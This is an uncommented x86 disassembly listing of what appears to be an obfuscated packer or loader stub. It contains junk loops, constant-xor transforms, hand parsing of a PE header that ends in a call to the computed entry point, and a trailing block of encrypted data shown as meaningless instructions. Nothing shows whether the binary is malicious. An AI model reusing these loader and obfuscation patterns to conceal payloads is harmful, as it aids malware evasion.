  408a3e:	mov    edx,DWORD PTR [ebp-0x34]
  408a41:	sub    DWORD PTR ds:0x41074b,ebx
  408a47:	xor    eax,esi
  408a49:	mov    DWORD PTR ds:0x448980,0x18
  408a53:	cmp    DWORD PTR ds:0x448980,0x0
  408a5a:	je     0x408b05
  408a60:	cmp    DWORD PTR ds:0x448980,0x2
  408a67:	jne    0x408a82
  408a6d:	push   DWORD PTR [ebp-0x28]
  408a70:	push   DWORD PTR [ebp-0x20]
  408a73:	push   DWORD PTR [ebp-0x10]
  408a76:	push   DWORD PTR [ebp-0x1c]
  408a79:	push   DWORD PTR [ebp-0x28]
  408a7c:	call   DWORD PTR ds:0x4430fc
  408a82:	cmp    DWORD PTR ds:0x448980,0x3
  408a89:	jne    0x408a9e
  408a8f:	xor    ebx,ebx
  408a91:	xor    ebx,DWORD PTR ds:0x448980
  408a97:	dec    ebx
  408a98:	mov    DWORD PTR ds:0x448980,ebx
  408a9e:	xor    ebx,ebx
  408aa0:	add    ebx,DWORD PTR ds:0x448980
  408aa6:	dec    ebx
  408aa7:	mov    DWORD PTR ds:0x448980,ebx
  408aad:	jmp    0x408a53
  408ab2:	and    DWORD PTR ds:0x4248ca,0x0
  408abc:	jmp    0x408ace
  408ac1:	mov    ebx,DWORD PTR ds:0x4248ca
  408ac7:	inc    ebx
  408ac8:	mov    DWORD PTR ds:0x4248ca,ebx
  408ace:	cmp    DWORD PTR ds:0x4248ca,0x10
  408ad5:	jae    0x408b05
  408adb:	cmp    DWORD PTR ds:0x4248ca,0x19
  408ae2:	jne    0x408af3
  408ae8:	push   0x82d5
  408aed:	call   DWORD PTR ds:0x443100
  408af3:	jmp    0x408ac1
  408af8:	movzx  ebx,WORD PTR ds:0x410757
  408aff:	and    DWORD PTR ds:0x4489a8,ebx
  408b05:	add    eax,edi
  408b07:	adc    DWORD PTR ds:0x4248d6,0x6c9f
  408b11:	mov    DWORD PTR [edx],eax
  408b13:	mov    DWORD PTR [ebp-0x2c],ecx
  408b16:	lea    eax,[ebp-0x2c]
  408b19:	or     ebx,ebx
  408b1b:	mov    DWORD PTR [ebp-0x14],eax
  408b1e:	add    ebx,eax
  408b20:	mov    eax,DWORD PTR [ebp-0x2c]
  408b23:	sub    ebx,0x4e67
  408b29:	mov    ecx,DWORD PTR [ebp-0x14]
  408b2c:	xor    eax,esi
  408b2e:	adc    ebx,0x2698
  408b34:	add    eax,0x32729e
  408b39:	and    DWORD PTR ds:0x4248de,0x0
  408b43:	mov    ebx,DWORD PTR ds:0x4248de
  408b49:	inc    ebx
  408b4a:	mov    DWORD PTR ds:0x4248de,ebx
  408b50:	cmp    DWORD PTR ds:0x4248de,0xb
  408b57:	jne    0x408b68
  408b5d:	push   0x410870
  408b62:	call   DWORD PTR ds:0x443104
  408b68:	cmp    DWORD PTR ds:0x4248de,0xa
  408b6f:	jne    0x408b82
  408b75:	mov    ebx,DWORD PTR ds:0x4248de
  408b7b:	inc    ebx
  408b7c:	mov    DWORD PTR ds:0x4248de,ebx
  408b82:	cmp    DWORD PTR ds:0x4248de,0x19
  408b89:	jb     0x408b43
  408b8f:	adc    ebx,DWORD PTR ds:0x41074b
  408b95:	mov    DWORD PTR [ecx],eax
  408b97:	sub    DWORD PTR ds:0x44b6dc,0x6b19
  408ba1:	mov    eax,ds:0x445274
  408ba6:	sbb    ebx,0x4548
  408bac:	mov    DWORD PTR [ebp-0x24],0x8e12febe
  408bb3:	xor    DWORD PTR ds:0x448998,edx
  408bb9:	mov    eax,DWORD PTR [eax]
  408bbb:	xor    DWORD PTR ds:0x44b6d0,ebx
  408bc1:	mov    cx,WORD PTR [ebp-0x10]
  408bc5:	movzx  ecx,cx
  408bc8:	xor    ebx,DWORD PTR ds:0x410757
  408bce:	add    ecx,DWORD PTR [eax]
  408bd0:	mov    DWORD PTR [ebp-0x40],0xf89c8531
  408bd7:	mov    ebx,DWORD PTR ds:0x448994
  408bdd:	sub    DWORD PTR ds:0x44b6e0,ebx
  408be3:	mov    DWORD PTR [ebp-0x14],ecx
  408be6:	xor    ebx,ebx
  408be8:	mov    ebx,0x5a3fc9e
  408bed:	and    DWORD PTR ds:0x44898c,0x0
  408bf7:	mov    ecx,DWORD PTR ds:0x44898c
  408bfd:	inc    ecx
  408bfe:	mov    DWORD PTR ds:0x44898c,ecx
  408c04:	cmp    DWORD PTR ds:0x44898c,0x7
  408c0b:	jne    0x408c36
  408c11:	push   0x7083
  408c16:	push   0x1db3
  408c1b:	push   0x7eea
  408c20:	push   0x448984
  408c25:	push   DWORD PTR [ebp-0x14]
  408c28:	push   DWORD PTR [ebp-0x24]
  408c2b:	push   0x41089f
  408c30:	call   DWORD PTR ds:0x44339c
  408c36:	cmp    DWORD PTR ds:0x44898c,0x6
  408c3d:	jne    0x408c50
  408c43:	mov    ecx,DWORD PTR ds:0x44898c
  408c49:	inc    ecx
  408c4a:	mov    DWORD PTR ds:0x44898c,ecx
  408c50:	cmp    DWORD PTR ds:0x44898c,0x10
  408c57:	jb     0x408bf7
  408c5d:	mov    eax,DWORD PTR [ebp-0x1c]
  408c60:	mov    ecx,DWORD PTR [ebp-0x8]
  408c63:	xor    eax,esi
  408c65:	add    eax,edi
  408c67:	mov    DWORD PTR ds:0x410757,0x128d
  408c71:	cmp    DWORD PTR [ecx],eax
  408c73:	mov    DWORD PTR ds:0x4248da,0x2c74
  408c7d:	jne    0x408de6
  408c83:	movzx  eax,BYTE PTR ds:0x410747
  408c8a:	adc    eax,DWORD PTR ds:0x410753
  408c90:	mov    ds:0x410747,eax
  408c95:	mov    eax,DWORD PTR [ebp-0x1c]
  408c98:	mov    ecx,DWORD PTR [ebp-0x14]
  408c9b:	or     DWORD PTR ds:0x44e424,0x44e420
  408ca5:	xor    eax,esi
  408ca7:	or     DWORD PTR ds:0x448988,0x44e428
  408cb1:	add    eax,edi
  408cb3:	mov    DWORD PTR ds:0x44899c,0x2417
  408cbd:	cmp    DWORD PTR [ecx],eax
  408cbf:	jne    0x408d21
  408cc5:	dec    edx
  408cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  408cc9:	sbb    DWORD PTR ds:0x44e424,0x7bb6
  408cd3:	mov    ecx,DWORD PTR [ebp-0x34]
  408cd6:	adc    DWORD PTR ds:0x448990,ecx
  408cdc:	xor    eax,esi
  408cde:	xor    DWORD PTR ds:0x44e420,0x6611
  408ce8:	add    eax,edi
  408cea:	movzx  edx,WORD PTR ds:0x4248c6
  408cf1:	sbb    DWORD PTR ds:0x4248ce,edx
  408cf7:	mov    DWORD PTR [ecx],eax
  408cf9:	dec    ecx
  408cfa:	mov    eax,DWORD PTR [ebp-0x34]
  408cfd:	mov    ecx,DWORD PTR [ebp-0x40]
  408d00:	sbb    edx,DWORD PTR ds:0x44e420
  408d06:	xor    ecx,esi
  408d08:	adc    edx,DWORD PTR ds:0x4489a8
  408d0e:	mov    edx,0xffcd8d62
  408d13:	sbb    DWORD PTR ds:0x448984,0x448980
  408d1d:	sub    edx,ecx
  408d1f:	add    DWORD PTR [eax],edx
  408d21:	mov    DWORD PTR ds:0x410747,0x19
  408d2b:	cmp    DWORD PTR ds:0x410747,0x0
  408d32:	je     0x408d8e
  408d38:	cmp    DWORD PTR ds:0x410747,0x5
  408d3f:	jne    0x408d63
  408d45:	push   DWORD PTR [ebp-0x1c]
  408d48:	push   0x2684
  408d4d:	push   DWORD PTR [ebp-0x18]
  408d50:	push   DWORD PTR [ebp-0x28]
  408d53:	push   0x71f6
  408d58:	push   0x2f24
  408d5d:	call   DWORD PTR ds:0x4433a0
  408d63:	cmp    DWORD PTR ds:0x410747,0x6
  408d6a:	jne    0x408d7b
  408d70:	mov    eax,ds:0x410747
  408d75:	dec    eax
  408d76:	mov    ds:0x410747,eax
  408d7b:	xor    eax,eax
  408d7d:	or     eax,DWORD PTR ds:0x410747
  408d83:	dec    eax
  408d84:	mov    ds:0x410747,eax
  408d89:	jmp    0x408d2b
  408d8e:	mov    eax,ds:0x445274
  408d93:	mov    eax,DWORD PTR [eax]
  408d95:	mov    cx,WORD PTR [ebp-0x10]
  408d99:	movzx  ecx,cx
  408d9c:	add    ecx,DWORD PTR [eax]
  408d9e:	mov    DWORD PTR [ebp-0x14],ecx
  408da1:	mov    eax,DWORD PTR [ebp-0x28]
  408da4:	mov    ecx,DWORD PTR [ebp-0x28]
  408da7:	xor    eax,esi
  408da9:	lea    eax,[eax+eax*1+0x32729e]
  408db0:	xor    ecx,esi
  408db2:	sub    ecx,eax
  408db4:	mov    ax,WORD PTR [ebp-0x10]
  408db8:	movzx  eax,ax
  408dbb:	cmp    eax,ecx
  408dbd:	mov    eax,DWORD PTR [ebp-0x40]
  408dc0:	movzx  ecx,WORD PTR [ebp-0x10]
  408dc4:	jg     0x408dd9
  408dca:	xor    eax,esi
  408dcc:	sub    ecx,eax
  408dce:	sub    ecx,edi
  408dd0:	mov    WORD PTR [ebp-0x10],cx
  408dd4:	jmp    0x408de6
  408dd9:	xor    eax,esi
  408ddb:	lea    eax,[eax+ecx*1+0x32729e]
  408de2:	mov    WORD PTR [ebp-0x10],ax
  408de6:	mov    ecx,DWORD PTR [ebp-0x24]
  408de9:	mov    eax,0x8e12febe
  408dee:	cmp    ecx,eax
  408df0:	je     0x408e04
  408df6:	mov    eax,DWORD PTR [ebp-0x8]
  408df9:	mov    DWORD PTR [eax],0x60341e8d
  408dff:	jmp    0x40902a
  408e04:	mov    ecx,DWORD PTR [ebp-0x24]
  408e07:	cmp    ecx,0x5142ddbc
  408e0d:	jne    0x408e85
  408e13:	mov    eax,DWORD PTR [ebp-0x8]
  408e16:	mov    DWORD PTR [eax],0x4214febc
  408e1c:	mov    eax,DWORD PTR [ebp-0x8]
  408e1f:	mov    DWORD PTR [ebp-0xc],eax
  408e22:	mov    eax,DWORD PTR [ebp-0x28]
  408e25:	mov    eax,DWORD PTR [ebp-0x1c]
  408e28:	mov    DWORD PTR [ebp-0x3c],ebx
  408e2b:	mov    eax,DWORD PTR [ebp-0x3c]
  408e2e:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408e35:	cmp    eax,ebx
  408e37:	jne    0x40902a
  408e3d:	mov    ax,WORD PTR [ebp-0x4]
  408e41:	mov    ecx,0x8a42
  408e46:	xor    ax,cx
  408e49:	mov    ecx,0x3b08
  408e4e:	add    ax,cx
  408e51:	mov    ecx,DWORD PTR [ebp-0xc]
  408e54:	movzx  eax,ax
  408e57:	not    eax
  408e59:	and    eax,DWORD PTR [ecx]
  408e5b:	mov    ecx,DWORD PTR [ebp-0xc]
  408e5e:	mov    DWORD PTR [ecx],eax
  408e60:	jmp    0x408e6c
  408e65:	xor    DWORD PTR [ebp-0x3c],0xe149ebe
  408e6c:	mov    ax,WORD PTR [ebp-0x4]
  408e70:	push   DWORD PTR [ebp-0xc]
  408e73:	call   0x407112
  408e78:	test   eax,eax
  408e7a:	je     0x408e65
  408e80:	jmp    0x40902a
  408e85:	mov    ecx,DWORD PTR [ebp-0x24]
  408e88:	cmp    ecx,0x1443fcbd
  408e8e:	jne    0x408ea2
  408e94:	mov    eax,DWORD PTR [ebp-0x8]
  408e97:	mov    DWORD PTR [eax],0x60062d8f
  408e9d:	jmp    0x40902a
  408ea2:	mov    ecx,DWORD PTR [ebp-0x24]
  408ea5:	cmp    ecx,eax
  408ea7:	jne    0x408faf
  408ead:	mov    eax,DWORD PTR [ebp-0x1c]
  408eb0:	mov    ecx,DWORD PTR [ebp-0x8]
  408eb3:	xor    eax,esi
  408eb5:	add    eax,edi
  408eb7:	cmp    DWORD PTR [ecx],eax
  408eb9:	je     0x408f3c
  408ebf:	mov    ecx,DWORD PTR [ebp-0x2c]
  408ec2:	mov    eax,DWORD PTR [ebp-0x8]
  408ec5:	mov    eax,DWORD PTR [eax]
  408ec7:	mov    eax,DWORD PTR [eax+0x3c]
  408eca:	lea    ecx,[ecx*8+0x78]
  408ed1:	add    eax,ecx
  408ed3:	mov    ecx,DWORD PTR [ebp-0x8]
  408ed6:	mov    ecx,DWORD PTR [ecx]
  408ed8:	mov    eax,DWORD PTR [eax+ecx*1]
  408edb:	mov    DWORD PTR [ebp-0x4],eax
  408ede:	mov    eax,DWORD PTR [ebp-0x1c]
  408ee1:	xor    eax,esi
  408ee3:	add    eax,edi
  408ee5:	mov    DWORD PTR [ebp-0xc],eax
  408ee8:	mov    eax,DWORD PTR [ebp-0x1c]
  408eeb:	mov    ecx,DWORD PTR [ebp-0x4]
  408eee:	xor    eax,esi
  408ef0:	add    eax,edi
  408ef2:	cmp    ecx,eax
  408ef4:	je     0x40902a
  408efa:	mov    eax,DWORD PTR [ebp-0x8]
  408efd:	mov    ecx,DWORD PTR [ebp-0x4]
  408f00:	add    ecx,DWORD PTR [eax]
  408f02:	mov    DWORD PTR [ebp-0xc],ecx
  408f05:	mov    eax,DWORD PTR [ebp-0xc]
  408f08:	mov    ecx,DWORD PTR [ebp-0x8]
  408f0b:	mov    eax,DWORD PTR [eax+0xc]
  408f0e:	mov    ecx,DWORD PTR [ecx]
  408f10:	mov    al,BYTE PTR [eax+ecx*1]
  408f13:	add    al,0x35
  408f15:	xor    al,0x49
  408f17:	cmp    al,0xc9
  408f19:	je     0x408f30
  408f1f:	mov    eax,DWORD PTR [ebp-0x1c]
  408f22:	mov    ecx,DWORD PTR [ebp-0x8]
  408f25:	xor    eax,esi
  408f27:	add    eax,edi
  408f29:	mov    DWORD PTR [ecx],eax
  408f2b:	jmp    0x40902a
  408f30:	xor    DWORD PTR [ebp-0x24],0x5fd8f
  408f37:	jmp    0x40902a
  408f3c:	mov    eax,DWORD PTR [ebp-0x8]
  408f3f:	mov    ecx,DWORD PTR [ebp-0x14]
  408f42:	mov    ecx,DWORD PTR [ecx]
  408f44:	mov    DWORD PTR [eax],ecx
  408f46:	mov    eax,DWORD PTR [ebp-0x8]
  408f49:	mov    DWORD PTR [ebp-0xc],eax
  408f4c:	mov    eax,DWORD PTR [ebp-0x28]
  408f4f:	mov    eax,DWORD PTR [ebp-0x1c]
  408f52:	mov    DWORD PTR [ebp-0x44],ebx
  408f55:	mov    eax,DWORD PTR [ebp-0x44]
  408f58:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408f5f:	cmp    eax,ebx
  408f61:	jne    0x40902a
  408f67:	mov    ax,WORD PTR [ebp-0x4]
  408f6b:	mov    ecx,0x8a42
  408f70:	xor    ax,cx
  408f73:	mov    ecx,0x3b08
  408f78:	add    ax,cx
  408f7b:	mov    ecx,DWORD PTR [ebp-0xc]
  408f7e:	movzx  eax,ax
  408f81:	not    eax
  408f83:	and    eax,DWORD PTR [ecx]
  408f85:	mov    ecx,DWORD PTR [ebp-0xc]
  408f88:	mov    DWORD PTR [ecx],eax
  408f8a:	jmp    0x408f96
  408f8f:	xor    DWORD PTR [ebp-0x44],0xe149ebe
  408f96:	mov    ax,WORD PTR [ebp-0x4]
  408f9a:	push   DWORD PTR [ebp-0xc]
  408f9d:	call   0x407112
  408fa2:	test   eax,eax
  408fa4:	je     0x408f8f
  408faa:	jmp    0x40902a
  408faf:	mov    eax,DWORD PTR [ebp-0x24]
  408fb2:	cmp    eax,0x33450cad
  408fb7:	jne    0x40902a
  408fbd:	mov    eax,DWORD PTR [ebp-0x8]
  408fc0:	mov    DWORD PTR [eax],0x443dc9d
  408fc6:	mov    eax,DWORD PTR [ebp-0x8]
  408fc9:	mov    DWORD PTR [ebp-0xc],eax
  408fcc:	mov    eax,DWORD PTR [ebp-0x28]
  408fcf:	mov    eax,DWORD PTR [ebp-0x1c]
  408fd2:	mov    DWORD PTR [ebp-0x38],ebx
  408fd5:	mov    eax,DWORD PTR [ebp-0x38]
  408fd8:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408fdf:	cmp    eax,ebx
  408fe1:	jne    0x40902a
  408fe7:	mov    ax,WORD PTR [ebp-0x4]
  408feb:	mov    ecx,0x8a42
  408ff0:	xor    ax,cx
  408ff3:	mov    ecx,0x3b08
  408ff8:	add    ax,cx
  408ffb:	mov    ecx,DWORD PTR [ebp-0xc]
  408ffe:	movzx  eax,ax
  409001:	not    eax
  409003:	and    eax,DWORD PTR [ecx]
  409005:	mov    ecx,DWORD PTR [ebp-0xc]
  409008:	mov    DWORD PTR [ecx],eax
  40900a:	jmp    0x409016
  40900f:	xor    DWORD PTR [ebp-0x38],0xe149ebe
  409016:	mov    ax,WORD PTR [ebp-0x4]
  40901a:	push   DWORD PTR [ebp-0xc]
  40901d:	call   0x407112
  409022:	test   eax,eax
  409024:	je     0x40900f
  40902a:	mov    eax,DWORD PTR [ebp-0x24]
  40902d:	cmp    eax,0x8e12febe
  409032:	je     0x408bed
  409038:	mov    eax,DWORD PTR [ebp-0x8]
  40903b:	mov    eax,ds:0x4451a0
  409040:	mov    eax,DWORD PTR [eax+0x18c]
  409046:	mov    eax,DWORD PTR [eax]
  409048:	mov    DWORD PTR [ebp-0x58],eax
  40904b:	mov    eax,0xf89c8531
  409050:	mov    DWORD PTR [ebp-0x14],eax
  409053:	mov    DWORD PTR [ebp-0x14],eax
  409056:	mov    DWORD PTR [ebp-0x14],eax
  409059:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  409060:	mov    DWORD PTR [ebp-0x4],eax
  409063:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  40906a:	mov    ebx,DWORD PTR [ebp-0x20]
  40906d:	xor    ebx,esi
  40906f:	add    ebx,edi
  409071:	jmp    0x4090ac
  409076:	mov    eax,DWORD PTR [ebp-0x18]
  409079:	xor    eax,esi
  40907b:	lea    eax,[eax+ebx*1+0x32729e]
  409082:	push   eax
  409083:	mov    eax,DWORD PTR [ebp-0x14]
  409086:	xor    eax,esi
  409088:	lea    eax,[ebp+eax*1+0x3272a6]
  40908f:	push   eax
  409090:	mov    eax,ds:0x4451a0
  409095:	push   DWORD PTR [eax+0x1bc]
  40909b:	call   0x402c35
  4090a0:	mov    eax,DWORD PTR [ebp-0x18]
  4090a3:	xor    eax,esi
  4090a5:	lea    ebx,[ebx+eax*1+0x32729e]
  4090ac:	mov    eax,DWORD PTR [ebp-0x18]
  4090af:	mov    ecx,DWORD PTR [ebp-0x18]
  4090b2:	xor    ecx,esi
  4090b4:	xor    eax,esi
  4090b6:	add    eax,ecx
  4090b8:	mov    ecx,DWORD PTR [ebp-0x18]
  4090bb:	xor    ecx,esi
  4090bd:	lea    eax,[eax+ecx*1+0x9757da]
  4090c4:	cmp    ebx,eax
  4090c6:	jbe    0x409076
  4090cc:	mov    eax,DWORD PTR [ebp+0xc]
  4090cf:	mov    ds:0x445024,eax
  4090d4:	mov    eax,DWORD PTR [ebp+0x10]
  4090d7:	mov    ds:0x445278,eax
  4090dc:	mov    eax,ds:0x445024
  4090e1:	mov    ecx,DWORD PTR [ebp-0x30]
  4090e4:	sub    eax,edi
  4090e6:	xor    eax,esi
  4090e8:	mov    DWORD PTR [ecx],eax
  4090ea:	mov    eax,DWORD PTR [ebp-0x4c]
  4090ed:	cmp    eax,0xf89c8534
  4090f2:	je     0x40914f
  4090f8:	mov    eax,DWORD PTR [ebp-0x20]
  4090fb:	mov    ecx,DWORD PTR [ebp-0x54]
  4090fe:	xor    eax,esi
  409100:	add    eax,edi
  409102:	cmp    eax,ecx
  409104:	je     0x40914f
  40910a:	mov    eax,ds:0x4451a0
  40910f:	mov    eax,DWORD PTR [eax+0x194]
  409115:	mov    ecx,DWORD PTR [eax]
  409117:	mov    eax,DWORD PTR [ecx+0x3c]
  40911a:	push   DWORD PTR ds:0x445278
  409120:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409124:	push   DWORD PTR ds:0x445024
  40912a:	add    eax,ecx
  40912c:	mov    ecx,DWORD PTR ds:0x4451a0
  409132:	mov    ecx,DWORD PTR [ecx+0x194]
  409138:	push   DWORD PTR [ecx]
  40913a:	call   eax
  40913c:	mov    ecx,DWORD PTR ds:0x4451a0
  409142:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409148:	mov    DWORD PTR [ecx],eax
  40914a:	jmp    0x409276
  40914f:	mov    eax,DWORD PTR [ebp-0x20]
  409152:	mov    ecx,DWORD PTR [ebp-0x58]
  409155:	xor    eax,esi
  409157:	add    eax,edi
  409159:	cmp    eax,ecx
  40915b:	jne    0x409259
  409161:	mov    eax,DWORD PTR [ebp-0x20]
  409164:	xor    eax,esi
  409166:	add    eax,edi
  409168:	mov    ds:0x445224,eax
  40916d:	mov    eax,DWORD PTR [ebp-0x20]
  409170:	xor    eax,esi
  409172:	add    eax,edi
  409174:	mov    ds:0x44521c,eax
  409179:	mov    eax,DWORD PTR [ebp-0x18]
  40917c:	mov    DWORD PTR [ebp-0x14],eax
  40917f:	mov    eax,DWORD PTR [ebp-0x20]
  409182:	mov    DWORD PTR [ebp+0xc],eax
  409185:	mov    eax,DWORD PTR [ebp+0xc]
  409188:	xor    eax,esi
  40918a:	add    eax,edi
  40918c:	mov    DWORD PTR [ebp+0xc],eax
  40918f:	mov    eax,ds:0x445020
  409194:	mov    eax,DWORD PTR [eax]
  409196:	mov    DWORD PTR [ebp+0xc],eax
  409199:	mov    eax,ds:0x445228
  40919e:	mov    eax,DWORD PTR [eax]
  4091a0:	mov    DWORD PTR [ebp-0x30],eax
  4091a3:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  4091aa:	mov    eax,DWORD PTR [ebp+0x10]
  4091ad:	xor    eax,esi
  4091af:	add    eax,edi
  4091b1:	mov    DWORD PTR [ebp+0x10],eax
  4091b4:	mov    eax,ds:0x4451a0
  4091b9:	mov    DWORD PTR [ebp+0x10],eax
  4091bc:	mov    eax,DWORD PTR [ebp+0xc]
  4091bf:	mov    DWORD PTR [ebp+0xc],eax
  4091c2:	mov    eax,DWORD PTR [ebp+0xc]
  4091c5:	push   0x4
  4091c7:	pop    ecx
  4091c8:	sub    ecx,eax
  4091ca:	add    ecx,DWORD PTR [ebp-0x30]
  4091cd:	mov    DWORD PTR [ebp-0x4],0xf89c85f5
  4091d4:	mov    DWORD PTR [ebp+0x10],ecx
  4091d7:	mov    DWORD PTR [ebp-0xa0],0xf89c8531
  4091e1:	mov    eax,DWORD PTR [ebp+0xc]
  4091e4:	mov    DWORD PTR [ebp-0x9c],eax
  4091ea:	mov    eax,DWORD PTR [ebp+0x10]
  4091ed:	mov    DWORD PTR [ebp-0x98],eax
  4091f3:	mov    eax,DWORD PTR [ebp-0x4]
  4091f6:	xor    eax,esi
  4091f8:	add    eax,edi
  4091fa:	mov    DWORD PTR [ebp-0x94],eax
  409200:	lea    eax,[ebp-0x5c]
  409203:	mov    DWORD PTR [ebp-0x90],eax
  409209:	mov    eax,DWORD PTR [ebp-0xa0]
  40920f:	xor    eax,esi
  409211:	add    eax,edi
  409213:	mov    DWORD PTR [ebp-0xa0],eax
  409219:	lea    eax,[ebp-0xa0]
  40921f:	push   eax
  409220:	mov    eax,DWORD PTR [ebp-0x14]
  409223:	xor    eax,esi
  409225:	add    eax,edi
  409227:	push   eax
  409228:	mov    eax,ds:0x4451c0
  40922d:	push   0x445116
  409232:	push   DWORD PTR [eax]
  409234:	call   0x40101c
  409239:	xor    esi,esi
  40923b:	mov    eax,DWORD PTR [ebp+0x10]
  40923e:	sub    eax,esi
  409240:	push   eax
  409241:	mov    eax,DWORD PTR [ebp+0xc]
  409244:	add    eax,esi
  409246:	push   eax
  409247:	call   0x40354e
  40924c:	inc    esi
  40924d:	cmp    esi,0x52
  409250:	jb     0x40923b
  409256:	mov    eax,DWORD PTR [ebp-0x14]
  409259:	call   0x405b6e
  40925e:	lea    eax,[ebp+0x4]
  409261:	mov    DWORD PTR [ebp-0x50],eax
  409264:	mov    eax,DWORD PTR [ebp-0x48]
  409267:	mov    eax,DWORD PTR [ebp-0x18]
  40926a:	push   DWORD PTR [ebp-0x20]
  40926d:	lea    eax,[ebp-0x50]
  409270:	push   eax
  409271:	call   0x40324f
  409276:	mov    eax,ds:0x4451a0
  40927b:	push   0x4
  40927d:	add    eax,0x1cc
  409282:	push   eax
  409283:	lea    eax,[ebp-0x48]
  409286:	push   eax
  409287:	call   0x402c35
  40928c:	mov    eax,DWORD PTR [ebp-0x48]
  40928f:	mov    eax,DWORD PTR [eax]
  409291:	pop    edi
  409292:	pop    ebx
  409293:	pop    esi
  409294:	leave  
  409295:	ret    0xc
  409298:	push   ebp
  409299:	mov    ebp,esp
  40929b:	sub    esp,0x58
  40929e:	add    eax,ecx
  4092a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4092a3:	sub    eax,DWORD PTR ds:0x448988
  4092a9:	mov    eax,0x8a42
  4092ae:	add    DWORD PTR ds:0x410753,0x4248ce
  4092b8:	xor    ax,WORD PTR [ecx+0x20]
  4092bc:	and    DWORD PTR ds:0x448990,0x0
  4092c6:	mov    ecx,DWORD PTR ds:0x448990
  4092cc:	inc    ecx
  4092cd:	mov    DWORD PTR ds:0x448990,ecx
  4092d3:	cmp    DWORD PTR ds:0x448990,0x9
  4092da:	jne    0x4092f3
  4092e0:	push   DWORD PTR [ebp-0x28]
  4092e3:	push   0x44899c
  4092e8:	push   0x55d9
  4092ed:	call   DWORD PTR ds:0x4433a4
  4092f3:	cmp    DWORD PTR ds:0x448990,0x8
  4092fa:	jne    0x40930d
  409300:	mov    ecx,DWORD PTR ds:0x448990
  409306:	inc    ecx
  409307:	mov    DWORD PTR ds:0x448990,ecx
  40930d:	cmp    DWORD PTR ds:0x448990,0x14
  409314:	jb     0x4092c6
  40931a:	mov    ecx,0x3b08
  40931f:	add    ax,cx
  409322:	movzx  eax,ax
  409325:	sub    ecx,0x7afe
  40932b:	mov    DWORD PTR [ebp-0xc],eax
  40932e:	mov    BYTE PTR [ebp-0x1],0x7f
  409332:	lea    eax,[ebp-0x1]
  409335:	mov    DWORD PTR [ebp-0x10],eax
  409338:	and    ecx,0x503
  40933e:	jmp    0x409494
  409343:	mov    ?,ebx
  409345:	icebp  
  409346:	test   al,0x85
  409348:	stos   BYTE PTR es:[edi],al
  409349:	mov    ebp,0xef32abd
  40934e:	cmp    eax,0xe629d230
  409353:	(bad)  
  409357:	daa    
  409358:	jg     0x4093d6
  40935a:	jl     0x40936c
  40935c:	sub    edi,DWORD PTR [eax+0xa]
  40935f:	cwde   
  409360:	jg     0x409345
  409362:	rcl    edi,cl
  409364:	mov    bh,0xeb
  409366:	or     esp,ecx
  409368:	pop    edi
  409369:	cmc    
  40936a:	pop    ebp
  40936b:	daa    
  40936c:	in     al,0xf3
  40936e:	jecxz  0x4093c2
  409370:	xchg   ebx,eax
  409371:	nop
  409372:	ins    BYTE PTR es:[edi],dx
  409373:	test   al,cl
  409375:	jp     0x4093ab
  409377:	pop    es
  409378:	out    dx,eax
  409379:	cwde   
  40937a:	sub    BYTE PTR [eax-0x1e],0x19
  40937e:	xlat   BYTE PTR ds:[ebx]
  40937f:	mov    ds:0x7b3faee4,al
  409384:	ficom  DWORD PTR [edi+ecx*8]
  409387:	mov    al,ds:0x5f368a57
  40938c:	inc    ebp
  40938d:	punpckhwd mm1,QWORD PTR [edx-0x42]
  409391:	nop
  409392:	arpl   dx,si
  409394:	cmp    BYTE PTR [edi+0x174af2ae],dh
  40939a:	mov    al,ds:0x74f9098c
  40939f:	inc    ebx
  4093a0:	mov    dh,0x65
  4093a2:	adc    al,0x8a
  4093a4:	mov    ebx,0xdf592945
  4093a9:	fdivr  st(6),st
  4093ab:	cmp    DWORD PTR ss:[ebx+0x65],0x7339bf6d
  4093b3:	cli    
  4093b4:	ss daa 
  4093b6:	jle    0x40942a
  4093b8:	mov    ch,ah
  4093ba:	rcr    DWORD PTR [edx+0x7e],1
  4093bd:	add    BYTE PTR [ecx],bl
  4093bf:	and    al,0x8f
  4093c1:	ins    BYTE PTR es:[edi],dx
  4093c2:	(bad)  
  4093c3:	sbb    DWORD PTR [edi-0x23],ebp
  4093c6:	push   0x85877017
  4093cb:	mov    WORD PTR [edi],es
  4093cd:	mov    ebp,DWORD PTR [eax+eiz*1-0x14779878]
  4093d4:	test   BYTE PTR [ebp-0x6b73663a],0x21
  4093db:	inc    ebx
  4093dc:	arpl   WORD PTR [esi+ecx*2],dx
  4093df:	push   cs
  4093e0:	mov    ds:0x957d0fdf,eax
  4093e5:	(bad)  
  4093e7:	lea    eax,cs:[eax-0x8]
  4093eb:	fcom   QWORD PTR [ebp+0x451099db]
  4093f1:	cwde   
  4093f2:	iret   
  4093f3:	or     BYTE PTR ds:0x2a4f80bd,bh
  4093f9:	cmp    DWORD PTR [ebx-0x7803fd52],0xffffff93
  409400:	dec    esp
  409401:	ss nop
  409403:	aaa    
  409404:	aas    
  409405:	ss arpl bx,di
  409408:	gs pop ds
  40940a:	lods   al,BYTE PTR ds:[esi]
  40940b:	bound  eax,QWORD PTR [eax+0x11]
  40940e:	xor    BYTE PTR [ecx],bl
  409410:	bound  esi,QWORD PTR [esi+edi*2-0xd]
  409414:	aad    0xe3
  409416:	jle    0x409489
  409418:	out    dx,al
  409419:	sub    eax,0xdd621048
  40941e:	int3   
  40941f:	jge    0x409455
  409421:	jns    0x409429
  409423:	(bad)  
  409424:	sub    BYTE PTR [edx],cl
  409426:	sub    edi,esi
  409428:	sahf   
  409429:	jnp    0x4094a8
  40942b:	je     0x409490
  40942d:	xlat   BYTE PTR ds:[ebx]
  40942e:	xor    BYTE PTR [esi+eiz*8-0x1be6dd58],bl
  409435:	add    bl,BYTE PTR [edx]
  409437:	mov    esp,0xb6a3cf83
  40943c:	inc    edx
  40943d:	push   0x22
  40943f:	or     DWORD PTR [ebp+ebp*1+0x4ae68f7f],edx
  409446:	jg     0x4094a5
  409448:	add    al,0x8f
  40944a:	push   0x7dbb5e45
  40944f:	cdq    
  409450:	adc    eax,0x10a07156
  409455:	mov    cl,0x21
